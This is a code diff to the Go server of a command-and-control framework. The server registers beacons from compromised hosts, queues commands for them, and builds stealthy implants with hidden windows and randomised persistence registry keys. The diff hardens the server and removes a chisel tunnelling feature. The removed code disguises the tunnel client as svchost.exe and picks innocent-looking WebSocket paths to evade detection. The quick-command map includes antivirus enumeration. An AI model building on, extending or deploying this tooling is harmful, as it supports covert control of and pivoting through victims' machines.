@@ -2,7 +2,6 @@ package main
 
 import (
 	"context"
-	cryptoRand "crypto/rand"
 	"crypto/sha256"
 	"encoding/base64"
 	"encoding/hex"
@@ -25,7 +24,11 @@ import (
 	"github.com/gin-gonic/gin"
 	"github.com/google/uuid"
 	"github.com/gorilla/websocket"
+	"gorm.io/gorm"
 )
+
+const maxBeaconHTTPBody = 64 << 20
+const maxManagedUploadSize int64 = 512 << 20
 
 // activeListeners keeps track of running listener http.Server instances
 var (
@@ -179,27 +182,45 @@ func processCommand(clientID, command string) (string, interface{}, error) {
 		parts := strings.Fields(command)
 		if len(parts) >= 2 {
 			if sleepVal, err := strconv.Atoi(parts[1]); err == nil {
+				if sleepVal < 1 || sleepVal > 86400 {
+					return "", nil, fmt.Errorf("sleep must be between 1 and 86400 seconds")
+				}
 				var client Client
 				if err := db.First(&client, "id = ?", clientID).Error; err == nil {
 					client.Sleep = sleepVal
 					if len(parts) >= 3 {
 						if jitterVal, err := strconv.Atoi(parts[2]); err == nil {
+							if jitterVal < 0 || jitterVal > 100 {
+								return "", nil, fmt.Errorf("jitter must be between 0 and 100")
+							}
 							client.Jitter = jitterVal
+						} else {
+							return "", nil, fmt.Errorf("invalid jitter value")
 						}
 					}
-					db.Save(&client)
+					if err := db.Save(&client).Error; err != nil {
+						return "", nil, err
+					}
 					msg := fmt.Sprintf("BEACON_CONFIG_UPDATE: sleep=%d jitter=%d for %s", client.Sleep, client.Jitter, clientID)
 					go addLog("CONFIG", msg)
 					return "CONFIG_UPDATED", nil, nil
 				}
+				return "", nil, fmt.Errorf("client not found: %s", clientID)
 			}
 		}
+		return "", nil, fmt.Errorf("invalid sleep command")
 	}
 
 	// Handle note command locally
 	if strings.HasPrefix(cmdLower, "note ") {
-		note := strings.TrimPrefix(command, command[:5])
-		db.Model(&Client{}).Where("id = ?", clientID).Update("note", note)
+		note := strings.TrimSpace(command[5:])
+		result := db.Model(&Client{}).Where("id = ?", clientID).Update("note", note)
+		if result.Error != nil {
+			return "", nil, result.Error
+		}
+		if result.RowsAffected == 0 {
+			return "", nil, fmt.Errorf("client not found: %s", clientID)
+		}
 		go addLog("C2", fmt.Sprintf("NOTE_SET: %s -> %s", clientID, note))
 		return "NOTE_SET", nil, nil
 	}
@@ -218,6 +239,13 @@ func newTaskID() string {
 }
 
 func createPendingTask(clientID, command string) (*Task, error) {
+	if strings.TrimSpace(clientID) == "" || strings.TrimSpace(command) == "" {
+		return nil, fmt.Errorf("client id and command are required")
+	}
+	var client Client
+	if err := db.Select("id").First(&client, "id = ?", clientID).Error; err != nil {
+		return nil, fmt.Errorf("client not found: %s", clientID)
+	}
 	for attempt := 0; attempt < 5; attempt++ {
 		task := &Task{
 			ID:        newTaskID(),
@@ -236,6 +264,28 @@ func createPendingTask(clientID, command string) (*Task, error) {
 		return task, nil
 	}
 	return nil, fmt.Errorf("failed to create unique task id")
+}
+
+func claimPendingTasks(clientID string) ([]Task, error) {
+	claimed := make([]Task, 0)
+	err := db.Transaction(func(tx *gorm.DB) error {
+		var candidates []Task
+		if err := tx.Where("client_id = ? AND status = ?", clientID, "pending").Order("created_at asc").Find(&candidates).Error; err != nil {
+			return err
+		}
+		for _, task := range candidates {
+			result := tx.Model(&Task{}).Where("id = ? AND status = ?", task.ID, "pending").Update("status", "running")
+			if result.Error != nil {
+				return result.Error
+			}
+			if result.RowsAffected == 1 {
+				task.Status = "running"
+				claimed = append(claimed, task)
+			}
+		}
+		return nil
+	})
+	return claimed, err
 }
 
 var (
@@ -285,24 +335,39 @@ func init() {
 	// Reset all listeners to stopped on startup
 	db.Model(&Listener{}).Where("status = ?", "running").Update("status", "stopped")
 
-	// Reset all proxies to dead on startup (chisel processes are lost on restart)
-	db.Model(&Proxy{}).Where("status = ?", "running").Update("status", "dead")
-
 	go handleMessages()
 
 	// Beacon offline detection goroutine
 	go func() {
 		for {
 			time.Sleep(30 * time.Second)
-			var clients []Client
-			db.Where("status = ?", "online").Find(&clients)
+			// Load only the fields needed by the periodic offline scan.
+			var clients []struct {
+				ID        string
+				Username  string
+				Hostname  string
+				IP        string
+				Sleep     int
+				LastCheck time.Time
+			}
+			db.Model(&Client{}).
+				Select("id", "username", "hostname", "ip", "sleep", "last_check").
+				Where("status = ?", "online").
+				Scan(&clients)
 			for _, c := range clients {
 				threshold := time.Duration(c.Sleep*3) * time.Second
 				if threshold < 90*time.Second {
 					threshold = 90 * time.Second
 				}
 				if time.Since(c.LastCheck) > threshold {
-					db.Model(&Client{}).Where("id = ?", c.ID).Update("status", "offline")
+					// Do not overwrite a concurrent check-in that refreshed last_check.
+					cutoff := time.Now().Add(-threshold)
+					result := db.Model(&Client{}).
+						Where("id = ? AND status = ? AND last_check <= ?", c.ID, "online", cutoff).
+						Update("status", "offline")
+					if result.Error != nil || result.RowsAffected != 1 {
+						continue
+					}
 					addLog("C2", fmt.Sprintf("BEACON_OFFLINE: %s (%s@%s, last seen %s ago)", c.ID, c.Username, c.Hostname, time.Since(c.LastCheck).Round(time.Second)))
 
 					// Broadcast beacon offline event via WS
@@ -364,7 +429,7 @@ func handleMessages() {
 
 func (l *Listener) Start() error {
 	switch l.Type {
-	case "reverse_http", "reverse_https":
+	case "reverse_http":
 		mux := http.NewServeMux()
 		mux.HandleFunc("/checkin", handleBeaconCheckin)
 
@@ -399,6 +464,9 @@ func (l *Listener) Start() error {
 				go handleTCPBeaconConn(conn, l.ID)
 			}
 		}()
+
+	case "reverse_https":
+		return fmt.Errorf("HTTPS_LISTENER_REQUIRES_TLS_CONFIGURATION")
 
 	default:
 		return fmt.Errorf("unsupported listener type: %s", l.Type)
@@ -451,6 +519,15 @@ func parseBeaconOS(r *http.Request) string {
 	default:
 		return "Unknown"
 	}
+}
+
+// beaconNodeName formats a beacon's default display name without assuming its
+// client-supplied ID has UUID length.
+func beaconNodeName(beaconID string) string {
+	if len(beaconID) > 8 {
+		beaconID = beaconID[:8]
+	}
+	return "NODE_" + beaconID
 }
 
 // ── TCP Protocol Helpers ─────────────────────────────────
@@ -528,6 +605,20 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
 				continue
 			}
+			if strings.TrimSpace(regData.BeaconID) == "" {
+				// An empty ID would create a shared primary key and merge all
+				// uninitialized TCP beacons into one client record.
+				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
+				continue
+			}
+			tcpSleep := regData.Sleep
+			if tcpSleep <= 0 {
+				tcpSleep = 60
+			}
+			tcpJitter := regData.Jitter
+			if tcpJitter < 0 {
+				tcpJitter = 10
+			}
 
 			beaconID = regData.BeaconID
 
@@ -538,7 +629,7 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				tcpCountry, tcpCountryCode := lookupGeoIP(remoteIP)
 				client = Client{
 					ID:          beaconID,
-					Name:        "NODE_" + beaconID[:8],
+					Name:        beaconNodeName(beaconID),
 					IP:          remoteIP,
 					InternalIP:  regData.InternalIP,
 					Status:      "online",
@@ -553,8 +644,8 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 					ListenerID:  listenerID,
 					FirstSeen:   time.Now(),
 					LastCheck:   time.Now(),
-					Sleep:       60,
-					Jitter:      10,
+					Sleep:       tcpSleep,
+					Jitter:      tcpJitter,
 					Country:     tcpCountry,
 					CountryCode: tcpCountryCode,
 				}
@@ -587,6 +678,12 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 				if regData.OS != "" {
 					client.OS = regData.OS
 				}
+				if regData.Sleep > 0 {
+					client.Sleep = regData.Sleep
+				}
+				if regData.Jitter >= 0 {
+					client.Jitter = regData.Jitter
+				}
 				db.Save(&client)
 			}
 			tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"OK"`)})
@@ -605,14 +702,13 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 			})
 
 			// Check for pending tasks
-			var pendingTasks []Task
-			db.Where("client_id = ? AND status = ?", beaconID, "pending").Find(&pendingTasks)
+			pendingTasks, err := claimPendingTasks(beaconID)
+			if err != nil {
+				tcpWriteMsg(conn, TCPMsg{Type: "ack", Data: json.RawMessage(`"ERROR"`)})
+				continue
+			}
 
 			if len(pendingTasks) > 0 {
-				for i := range pendingTasks {
-					pendingTasks[i].Status = "running"
-					db.Save(&pendingTasks[i])
-				}
 				tasksJSON, _ := json.Marshal(pendingTasks)
 				tcpWriteMsg(conn, TCPMsg{Type: "tasks", Data: json.RawMessage(tasksJSON)})
 			} else {
@@ -625,15 +721,12 @@ func handleTCPBeaconConn(conn net.Conn, listenerID string) {
 			}
 
 		case "result":
-			var taskResult struct {
-				TaskID string `json:"task_id"`
-				Output string `json:"output"`
-			}
+			var taskResult TaskResultData
 			if err := json.Unmarshal(msg.Data, &taskResult); err != nil || taskResult.TaskID == "" {
 				continue
 			}
 			var task Task
-			if err := db.First(&task, "id = ?", taskResult.TaskID).Error; err == nil {
+			if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", taskResult.TaskID, beaconID, "running").Error; err == nil {
 				task.Status = "completed"
 				task.Result = taskResult.Output
 				db.Save(&task)
@@ -664,6 +757,7 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if r.Method == http.MethodPost {
+		r.Body = http.MaxBytesReader(w, r.Body, maxBeaconHTTPBody)
 		body, err := io.ReadAll(r.Body)
 		if err != nil {
 			w.WriteHeader(http.StatusBadRequest)
@@ -678,13 +772,14 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 		}
 
 		// Try to parse as task result
-		var result struct {
-			TaskID string `json:"task_id"`
-			Output string `json:"output"`
-		}
+		var result TaskResultData
 		if err := json.Unmarshal(body, &result); err == nil && result.TaskID != "" {
+			if strings.TrimSpace(result.BeaconID) == "" {
+				w.WriteHeader(http.StatusBadRequest)
+				return
+			}
 			var task Task
-			if err := db.First(&task, "id = ?", result.TaskID).Error; err == nil {
+			if err := db.First(&task, "id = ? AND client_id = ? AND status = ?", result.TaskID, result.BeaconID, "running").Error; err == nil {
 				task.Status = "completed"
 				task.Result = result.Output
 				db.Save(&task)
@@ -726,7 +821,7 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 		basicCountry, basicCountryCode := lookupGeoIP(basicIP)
 		client = Client{
 			ID:          clientID,
-			Name:        "NODE_" + clientID[:8],
+			Name:        beaconNodeName(clientID),
 			IP:          basicIP,
 			Status:      "online",
 			OS:          beaconOS,
@@ -755,14 +850,13 @@ func handleBeaconCheckin(w http.ResponseWriter, r *http.Request) {
 	}
 
 	// Check for pending tasks
-	var pendingTasks []Task
-	db.Where("client_id = ? AND status = ?", clientID, "pending").Find(&pendingTasks)
+	pendingTasks, err := claimPendingTasks(clientID)
+	if err != nil {
+		w.WriteHeader(http.StatusInternalServerError)
+		return
+	}
 
 	if len(pendingTasks) > 0 {
-		for i := range pendingTasks {
-			pendingTasks[i].Status = "running"
-			db.Save(&pendingTasks[i])
-		}
 		w.Header().Set("Content-Type", "application/json")
 		json.NewEncoder(w).Encode(pendingTasks)
 		return
@@ -807,7 +901,7 @@ func handleBeaconRegistration(w http.ResponseWriter, r *http.Request, data Check
 		// New registration
 		name := data.Hostname
 		if name == "" {
-			name = "NODE_" + data.BeaconID[:8]
+			name = beaconNodeName(data.BeaconID)
 		}
 		beaconSleep := data.Sleep
 		if beaconSleep <= 0 {
@@ -904,7 +998,6 @@ func handleQuickCommand(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
-
 	cmdMap := map[string]string{
 		"sysinfo":        "systeminfo",
 		"avinfo":         "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /format:list",
@@ -957,6 +1050,14 @@ func handleCreateListener(c *gin.Context) {
 
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
+		return
+	}
+	if req.Port < 1 || req.Port > 65535 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_PORT"})
+		return
+	}
+	if req.Type != "reverse_http" && req.Type != "reverse_tcp" {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UNSUPPORTED_LISTENER_TYPE"})
 		return
 	}
 
@@ -1023,10 +1124,14 @@ func handleDeleteListener(c *gin.Context) {
 	id := c.Param("id")
 
 	alMutex.Lock()
-	if l, exists := activeListeners[id]; exists {
-		l.Stop()
-	}
+	l, exists := activeListeners[id]
 	alMutex.Unlock()
+	if exists {
+		if err := l.Stop(); err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
+			return
+		}
+	}
 
 	result := db.Delete(&Listener{}, "id = ?", id)
 	if result.Error != nil {
@@ -1083,8 +1188,8 @@ func handleGetClientDetail(c *gin.Context) {
 func handleUpdateClientNote(c *gin.Context) {
 	id := c.Param("id")
 	var req struct {
-		Note  string `json:"note"`
-		Group string `json:"group"`
+		Note  *string `json:"note"`
+		Group *string `json:"group"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
@@ -1092,17 +1197,27 @@ func handleUpdateClientNote(c *gin.Context) {
 	}
 
 	updates := map[string]interface{}{}
-	if req.Note != "" {
-		updates["note"] = req.Note
+	if req.Note != nil {
+		updates["note"] = *req.Note
 	}
-	if req.Group != "" {
-		updates["group"] = req.Group
+	if req.Group != nil {
+		updates["group"] = *req.Group
 	}
 
-	if len(updates) > 0 {
-		db.Model(&Client{}).Where("id = ?", id).Updates(updates)
-		addLog("C2", fmt.Sprintf("CLIENT_UPDATED: %s note=%s group=%s", id, req.Note, req.Group))
+	if len(updates) == 0 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "NO_UPDATES"})
+		return
 	}
+	result := db.Model(&Client{}).Where("id = ?", id).Updates(updates)
+	if result.Error != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPDATE_FAILED"})
+		return
+	}
+	if result.RowsAffected == 0 {
+		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: "NOT_FOUND"})
+		return
+	}
+	addLog("C2", fmt.Sprintf("CLIENT_UPDATED: %s", id))
 
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "UPDATED"})
 }
@@ -1146,19 +1261,33 @@ func handleSaveSettings(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	if req.SessionTimeout < 1 || req.SessionTimeout > 720 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SESSION_TIMEOUT"})
+		return
+	}
+	if len(req.ServerName) > 128 || len(req.Theme) > 64 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_SETTINGS_VALUE"})
+		return
+	}
 
 	var settings Settings
 	if err := db.First(&settings).Error; err != nil {
 		// If no settings exist, create new
 		settings = req
-		db.Create(&settings)
+		if err := db.Create(&settings).Error; err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
+			return
+		}
 	} else {
 		// Update existing
 		settings.ServerName = req.ServerName
 		settings.SessionTimeout = req.SessionTimeout
 		settings.Theme = req.Theme
 		settings.Debug = req.Debug
-		db.Save(&settings)
+		if err := db.Save(&settings).Error; err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SETTINGS_SAVE_FAILED"})
+			return
+		}
 	}
 
 	settingsMutex.Lock()
@@ -1188,6 +1317,10 @@ func handleChangePassword(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
 		return
 	}
+	if len(req.NewPassword) < 12 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "PASSWORD_TOO_SHORT"})
+		return
+	}
 
 	session := sessions.Default(c)
 	username := session.Get("user")
@@ -1197,13 +1330,25 @@ func handleChangePassword(c *gin.Context) {
 	}
 
 	var user User
-	if err := db.Where("username = ? AND password = ?", username, req.OldPassword).First(&user).Error; err != nil {
+	if err := db.Where("username = ?", username).First(&user).Error; err != nil {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "OLD_PASSWORD_INCORRECT"})
+		return
+	}
+	if valid, _ := verifyPassword(user.Password, req.OldPassword); !valid {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "OLD_PASSWORD_INCORRECT"})
 		return
 	}
 
-	user.Password = req.NewPassword
-	db.Save(&user)
+	passwordHash, hashErr := hashPassword(req.NewPassword)
+	if hashErr != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PASSWORD_HASH_FAILED"})
+		return
+	}
+	user.Password = passwordHash
+	if err := db.Save(&user).Error; err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "PASSWORD_UPDATE_FAILED"})
+		return
+	}
 
 	addLog("SEC", fmt.Sprintf("PASSWORD_CHANGED: %s", username))
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "PASSWORD_CHANGED"})
@@ -1246,7 +1391,7 @@ func handleGeneratePayload(c *gin.Context) {
 		OS           string `json:"os"`
 		Arch         string `json:"arch"`
 		Sleep        int    `json:"sleep"`
-		Jitter       int    `json:"jitter"`
+		Jitter       *int   `json:"jitter"`
 		AllowedIPs   string `json:"allowed_ips"`
 		BlockedIPs   string `json:"blocked_ips"`
 	}
@@ -1269,6 +1414,10 @@ func handleGeneratePayload(c *gin.Context) {
 	if c2Port <= 0 {
 		c2Port = listener.Port
 	}
+	if c2Port < 1 || c2Port > 65535 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_CALLBACK_PORT"})
+		return
+	}
 
 	proto := "http"
 	c2URL := fmt.Sprintf("http://%s:%d", c2Host, c2Port)
@@ -1281,9 +1430,13 @@ func handleGeneratePayload(c *gin.Context) {
 	if sleepVal <= 0 {
 		sleepVal = 60
 	}
-	jitterVal := req.Jitter
-	if jitterVal <= 0 {
-		jitterVal = 10
+	jitterVal := 10
+	if req.Jitter != nil {
+		jitterVal = *req.Jitter
+	}
+	if jitterVal < 0 || jitterVal > 100 {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_JITTER"})
+		return
 	}
 
 	if req.OS == "" {
@@ -1365,7 +1518,9 @@ func handleGeneratePayload(c *gin.Context) {
 		}
 
 	case "bash":
-		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, beaconID, sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
+		// Bash payloads generate a fresh ID at process startup. Reusing a
+		// build-time ID would merge every instance of one script into one beacon.
+		if err := generateFromTemplate("implants/beacon.sh", dstFile, c2URL, "", sleepVal, jitterVal, proto, allowedIPs, blockedIPs); err != nil {
 			addLog("ERR", "BASH_GEN_FAILED: "+err.Error())
 			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
 			return
@@ -1506,9 +1661,9 @@ func buildGoImplant(dstFile, targetOS, targetArch, c2URL, beaconID string, sleep
 
 	// Build ldflags: strip symbols + inject config
 	// -H windowsgui: Windows GUI subsystem (no console window)
-	ldflagsBase := "-s -w"
+	ldflagsBase := "-s -w -buildid="
 	if targetOS == "windows" || (targetOS == "" && runtime.GOOS == "windows") {
-		ldflagsBase = "-s -w -H windowsgui"
+		ldflagsBase = "-s -w -buildid= -H windowsgui"
 	}
 	// Randomize Windows persist registry key name
 	persistNames := []string{
@@ -1707,25 +1862,22 @@ func handleGetFiles(c *gin.Context) {
 		}
 	}
 
-	// Queue file list task using the cross-platform __FILELIST__ command
-	taskID := "T-" + uuid.New().String()[:8]
-	newTask := &Task{
-		ID:        taskID,
-		ClientID:  clientID,
-		Command:   cmd,
-		Status:    "pending",
-		CreatedAt: time.Now(),
+	// Queue file list task using the cross-platform __FILELIST__ command.
+	newTask, err := createPendingTask(clientID, cmd)
+	if err != nil {
+		c.JSON(http.StatusNotFound, APIResponse{Status: "error", Message: err.Error()})
+		return
 	}
-	db.Create(newTask)
 
 	c.JSON(http.StatusOK, APIResponse{
 		Status:  "success",
 		Message: "FILE_LIST_QUEUED",
-		Data:    map[string]string{"task_id": taskID},
+		Data:    map[string]string{"task_id": newTask.ID},
 	})
 }
 
 func handleFileUpload(c *gin.Context) {
+	c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, maxManagedUploadSize+1<<20)
 	clientID := c.PostForm("client_id")
 	file, err := c.FormFile("file")
 
@@ -1733,68 +1885,46 @@ func handleFileUpload(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "MISSING_PARAMS"})
 		return
 	}
+	if file.Size < 0 || file.Size > maxManagedUploadSize {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "UPLOAD_TOO_LARGE"})
+		return
+	}
 
 	// Save file to uploads directory
 	uploadDir := "./uploads"
 	if _, err := os.Stat(uploadDir); os.IsNotExist(err) {
-		os.MkdirAll(uploadDir, 0755)
+		if err := os.MkdirAll(uploadDir, 0755); err != nil {
+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPLOAD_DIR_FAILED"})
+			return
+		}
+	} else if err != nil {
+		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "UPLOAD_DIR_FAILED"})
+		return
 	}
 
-	dst := filepath.Join(uploadDir, file.Filename)
+	// Multipart filenames are client-controlled and may contain path
+	// separators. Keep uploads inside the dedicated directory.
+	filename := filepath.Base(filepath.Clean(file.Filename))
+	if filename == "." || filename == string(filepath.Separator) || filename == "" {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_FILENAME"})
+		return
+	}
+	dst := filepath.Join(uploadDir, filename)
+	uploadRoot, err := filepath.Abs(uploadDir)
+	if err != nil || !pathWithinRoot(dst, uploadRoot) {
+		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: "INVALID_UPLOAD_PATH"})
+		return
+	}
 	if err := c.SaveUploadedFile(file, dst); err != nil {
 		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "SAVE_FAILED: " + err.Error()})
 		return
 	}
 
-	addLog("FILE", fmt.Sprintf("FILE_UPLOADED: %s (%d bytes) for %s", file.Filename, file.Size, clientID))
+	addLog("FILE", fmt.Sprintf("FILE_UPLOADED: %s (%d bytes) for %s", filename, file.Size, clientID))
 	c.JSON(http.StatusOK, APIResponse{Status: "success", Message: "FILE_UPLOADED", Data: map[string]string{
-		"filename": file.Filename,
+		"filename": filename,
 		"path":     dst,
 	}})
-}
-
-// ══════════════════════════════════════════════════════════
-//  Proxy / Chisel Tunnel Management
-// ══════════════════════════════════════════════════════════
-
-var (
-	chiselProcs   = make(map[string]*exec.Cmd) // proxy ID -> running process
-	chiselProcsMu sync.Mutex
-)
-
-// randomWsPath generates an innocent-looking WebSocket path to avoid chisel signature
-func randomWsPath() string {
-	paths := []string{
-		"/api/v2/events", "/ws/notifications", "/api/stream",
-		"/socket/updates", "/api/health/ws", "/connect/realtime",
-		"/api/v1/feed", "/ws/telemetry", "/api/sync",
-		"/gateway/ws", "/push/channel", "/api/v3/live",
-	}
-	return paths[time.Now().UnixNano()%int64(len(paths))]
-}
-
-// randomAuthKey generates a random auth key
-func randomAuthKey() string {
-	b := make([]byte, 16)
-	if _, err := io.ReadFull(cryptoRand.Reader, b); err != nil {
-		return uuid.New().String()
-	}
-	return fmt.Sprintf("%x", b)
-}
-
-// findChiselBinary locates the chisel binary in tools/
-func findChiselBinary() string {
-	candidates := []string{
-		"tools/chisel.exe", "tools/chisel",
-		"chisel.exe", "chisel",
-	}
-	for _, c := range candidates {
-		if _, err := os.Stat(c); err == nil {
-			abs, _ := filepath.Abs(c)
-			return abs
-		}
-	}
-	return ""
 }
 
 // ══════════════════════════════════════════════════════════
@@ -2321,204 +2451,6 @@ func main() {
 `, len(peBytes), formatted)
 }
 
-func handleGetProxies(c *gin.Context) {
-	var proxyList []Proxy
-	db.Order("created_at desc").Find(&proxyList)
-
-	// Check which ones are actually alive
-	chiselProcsMu.Lock()
-	for i := range proxyList {
-		if cmd, ok := chiselProcs[proxyList[i].ID]; ok {
-			if cmd.Process != nil && cmd.ProcessState == nil {
-				proxyList[i].Status = "running"
-			} else {
-				proxyList[i].Status = "dead"
-			}
-		} else {
-			// Not in process map: server restarted or never tracked — treat as dead
-			if proxyList[i].Status == "running" {
-				proxyList[i].Status = "dead"
-			}
-		}
-	}
-	chiselProcsMu.Unlock()
-
-	c.JSON(http.StatusOK, APIResponse{Status: "success", Data: proxyList})
-}
-
-func handleCreateProxy(c *gin.Context) {
-	var req struct {
-		Type       string `json:"type" binding:"required"` // chisel_reverse_socks, chisel_reverse_port, chisel_forward
-		ListenPort int    `json:"listen_port" binding:"required"`
-		RemoteStr  string `json:"remote_str"` // e.g. "R:socks" or "R:8080:10.0.0.1:80"
-		ClientID   string `json:"client_id"`
-	}
-
-	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: err.Error()})
-		return
-	}
-
-	chiselBin := findChiselBinary()
-	if chiselBin == "" {
-		c.JSON(http.StatusBadRequest, APIResponse{
-			Status:  "error",
-			Message: "CHISEL_NOT_FOUND: Place chisel binary in ./tools/ directory",
-		})
-		return
-	}
-
-	wsPath := randomWsPath()
-	authKey := randomAuthKey()
-
-	// Build remote spec
-	remoteSpec := req.RemoteStr
-	if remoteSpec == "" {
-		switch req.Type {
-		case "chisel_reverse_socks":
-			remoteSpec = fmt.Sprintf("R:0.0.0.0:%d:socks", req.ListenPort)
-		case "chisel_reverse_port":
-			remoteSpec = fmt.Sprintf("R:0.0.0.0:%d", req.ListenPort)
-		default:
-			remoteSpec = fmt.Sprintf("0.0.0.0:%d", req.ListenPort)
-		}
-	}
-
-	newID := "PX-" + uuid.New().String()[:8]
-
-	// Start chisel server
-	serverPort := req.ListenPort + 10000
-	if serverPort > 65535 {
-		serverPort = 50000 + (req.ListenPort % 10000)
-	}
-
-	// Check for port conflict with existing running proxies
-	var conflictCount int64
-	db.Model(&Proxy{}).Where("listen_port = ? AND status = ?", serverPort, "running").Count(&conflictCount)
-	if conflictCount > 0 {
-		c.JSON(http.StatusConflict, APIResponse{
-			Status:  "error",
-			Message: fmt.Sprintf("PORT_CONFLICT: port %d is already in use by another tunnel", serverPort),
-		})
-		return
-	}
-
-	args := []string{
-		"server",
-		"--port", strconv.Itoa(serverPort),
-		"--auth", authKey,
-		"--reverse",
-	}
-
-	cmd := exec.Command(chiselBin, args...)
-
-	if err := cmd.Start(); err != nil {
-		c.JSON(http.StatusInternalServerError, APIResponse{
-			Status: "error", Message: "CHISEL_START_FAILED: " + err.Error(),
-		})
-		return
-	}
-
-	pid := 0
-	if cmd.Process != nil {
-		pid = cmd.Process.Pid
-	}
-
-	// Add to map BEFORE starting goroutine to avoid race condition:
-	// if the process exits immediately, the goroutine's delete() would be a no-op,
-	// then the main thread would add a dead cmd to the map forever.
-	chiselProcsMu.Lock()
-	chiselProcs[newID] = cmd
-	chiselProcsMu.Unlock()
-
-	// Monitor process exit in background
-	go func() {
-		cmd.Wait()
-		chiselProcsMu.Lock()
-		delete(chiselProcs, newID)
-		chiselProcsMu.Unlock()
-		db.Model(&Proxy{}).Where("id = ?", newID).Update("status", "dead")
-		addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_EXITED: %s (PID %d)", newID, pid))
-	}()
-
-	serverURL := fmt.Sprintf("http://C2_HOST:%d", serverPort)
-
-	p := &Proxy{
-		ID:         newID,
-		ClientID:   req.ClientID,
-		Type:       req.Type,
-		Mode:       "server",
-		ListenPort: serverPort,
-		RemoteStr:  remoteSpec,
-		ServerURL:  serverURL,
-		AuthKey:    authKey,
-		WsPath:     wsPath,
-		Status:     "running",
-		PID:        pid,
-		CreatedAt:  time.Now(),
-	}
-
-	if err := db.Create(p).Error; err != nil {
-		cmd.Process.Kill()
-		c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: err.Error()})
-		return
-	}
-
-	// Build client command for deployment on target
-	clientCmd := buildChiselClientCmd(serverPort, authKey, wsPath, remoteSpec)
-
-	addLog("PROXY", fmt.Sprintf("CHISEL_SERVER_STARTED: %s port=%d ws=%s PID=%d", newID, serverPort, wsPath, pid))
-
-	c.JSON(http.StatusOK, APIResponse{
-		Status: "success",
-		Data: map[string]interface{}{
-			"proxy":      p,
-			"client_cmd": clientCmd,
-			"deploy_tip": "Replace C2_HOST with your actual C2 IP/domain",
-		},
-	})
-}
-
-// buildChiselClientCmd generates the client command for target deployment
-func buildChiselClientCmd(serverPort int, authKey, wsPath, remoteSpec string) string {
-	// Use innocent binary name
-	binName := "svchost.exe"
-
-	return fmt.Sprintf(
-		`%s client --auth "%s" --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" --header "Accept: text/html,*/*" http://C2_HOST:%d%s %s`,
-		binName, authKey, serverPort, wsPath, remoteSpec,
-	)
-}
-
-func handleDeleteProxy(c *gin.Context) {
-	id := c.Param("id")
-
-	// Kill chisel process if running
-	chiselProcsMu.Lock()
-	if cmd, ok := chiselProcs[id]; ok {
-		if cmd.Process != nil {
-			cmd.Process.Kill()
-		}
-		delete(chiselProcs, id)
-	}
-	chiselProcsMu.Unlock()
-
-	result := db.Delete(&Proxy{}, "id = ?", id)
-	if result.Error != nil {
